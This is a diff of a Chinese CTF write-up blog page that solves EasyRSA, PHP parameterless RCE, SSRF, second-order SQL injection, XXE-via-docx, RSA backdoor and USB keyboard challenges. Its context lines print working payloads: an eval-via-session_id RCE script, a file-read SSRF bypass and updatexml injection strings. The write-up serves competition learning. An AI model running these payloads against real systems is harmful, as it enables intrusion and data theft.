@@ -166,8 +166,8 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1><span id="签到题-easyrsa">签到题 EasyRSA</span></h1><p>给了flag.en和rsa_private_key.pem私钥，直接用openssl解密，得到flag{We1c0meCtf3r_elab}<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327160717181.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="web1-rce_nopar">Web1 rce_nopar</span></h1><p>php的无参数rce，利用PHPSESSID，参考：<a href="https://xz.aliyun.com/t/6316#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6316#toc-8</a></p>
+            <h1 id="签到题-EasyRSA"><a href="#签到题-EasyRSA" class="headerlink" title="签到题 EasyRSA"></a>签到题 EasyRSA</h1><p>给了flag.en和rsa_private_key.pem私钥，直接用openssl解密，得到flag{We1c0meCtf3r_elab}<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327160717181.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h1 id="Web1-rce-nopar"><a href="#Web1-rce-nopar" class="headerlink" title="Web1 rce_nopar"></a>Web1 rce_nopar</h1><p>php的无参数rce，利用PHPSESSID，参考：<a href="https://xz.aliyun.com/t/6316#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/6316#toc-8</a></p>
 <p>脚本如下：</p>
 <pre><code class="python">import requests
 import binascii
@@ -182,7 +182,7 @@ r = requests.post(&#39;http://124.193.74.212:7905?var=eval(hex2bin(session_id(se
 print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))
 </code></pre>
 <p><img src="/2020/03/30/YLB-CTF-Writeup/20200327161220829.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="web2-ssrf">Web2  SSRF</span></h1><p>把index.php两次base64编码传入，可以返回源码的base64，里面有提示：hal0flagi5here.php</p>
+<h1 id="Web2-SSRF"><a href="#Web2-SSRF" class="headerlink" title="Web2  SSRF"></a>Web2  SSRF</h1><p>把index.php两次base64编码传入，可以返回源码的base64，里面有提示：hal0flagi5here.php</p>
 <p>然后同样的方式读取该文件源码如下：</p>
 <pre><code class="php">&lt;?php
 $argv[1]=$_GET[&#39;url&#39;];
@@ -208,7 +208,7 @@ if(filter_var($argv[1],FILTER_VALIDATE_URL))
 <p>然后参考前一段时间“高校战役”的一道SSRF题目，使用如下payload绕过：</p>
 <pre><code>url=compress.zlib://file:@happyctf.com/../../../flag.txt
 </code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200327162418535.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="web3-sqli">Web3 SQLI</span></h1><p>几乎RCTF2015 easysql的原题，就改了个flag的位置，修改密码的地方存在二次注入，利用报错可以拿到数据。</p>
+<h1 id="Web3-SQLI"><a href="#Web3-SQLI" class="headerlink" title="Web3 SQLI"></a>Web3 SQLI</h1><p>几乎RCTF2015 easysql的原题，就改了个flag的位置，修改密码的地方存在二次注入，利用报错可以拿到数据。</p>
 <p>注册如下用户名:</p>
 <pre><code>Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#
 </code></pre><p>登陆后修改密码造成二次注入：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200329155336514.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后同样的步骤得到列名：</p>
@@ -216,7 +216,7 @@ if(filter_var($argv[1],FILTER_VALIDATE_URL))
 </code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155459916.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>得到flag：</p>
 <pre><code>Lethe&quot;||updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1)#
 </code></pre><p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155644552.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="web4-xxe">Web4 XXE</span></h1><p>利用docx文件进行xxe，并且给了源码:</p>
+<h1 id="Web4-XXE"><a href="#Web4-XXE" class="headerlink" title="Web4 XXE"></a>Web4 XXE</h1><p>利用docx文件进行xxe，并且给了源码:</p>
 <pre><code class="php">&lt;?php
 if(isset($_POST[&quot;submit&quot;])) {
     $target_file = getcwd().&quot;/upload/&quot;.md5($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
@@ -238,7 +238,7 @@ if(isset($_POST[&quot;submit&quot;])) {
 }
 </code></pre>
 <p>可以看到是从docProps目录下的core.xml读取xml，所以把docx文件解压后在core.xml里构造payload：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170815267.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后在压缩回docx文件：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170910380.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上传该docx文件即可得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170945365.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="crypto2-rsabackdoor">Crypto2 RSABackDoor</span></h1><p>参考：<a href="https://blog.csdn.net/qq_29457453/article/details/104918136" target="_blank" rel="noopener">https://blog.csdn.net/qq_29457453/article/details/104918136</a></p>
+<h1 id="Crypto2-RSABackDoor"><a href="#Crypto2-RSABackDoor" class="headerlink" title="Crypto2 RSABackDoor"></a>Crypto2 RSABackDoor</h1><p>参考：<a href="https://blog.csdn.net/qq_29457453/article/details/104918136" target="_blank" rel="noopener">https://blog.csdn.net/qq_29457453/article/details/104918136</a></p>
 <p>脚本如下：</p>
 <pre><code class="python">import libnum
 import gmpy2
@@ -273,7 +273,7 @@ m = pow(c, d, n)
 print(libnum.n2s(m))
 </code></pre>
 <p>运行得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/2020032717243017.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h1><span id="misc3-keyboard">Misc3    Keyboard</span></h1><p>先执行下面命令：</p>
+<h1 id="Misc3-Keyboard"><a href="#Misc3-Keyboard" class="headerlink" title="Misc3    Keyboard"></a>Misc3    Keyboard</h1><p>先执行下面命令：</p>
 <pre><code class="bash">tshark -r u.pcapng -T fields -e usb.capdata &gt; usbdata.txt
 </code></pre>
 <p>网上找到下面脚本：</p>
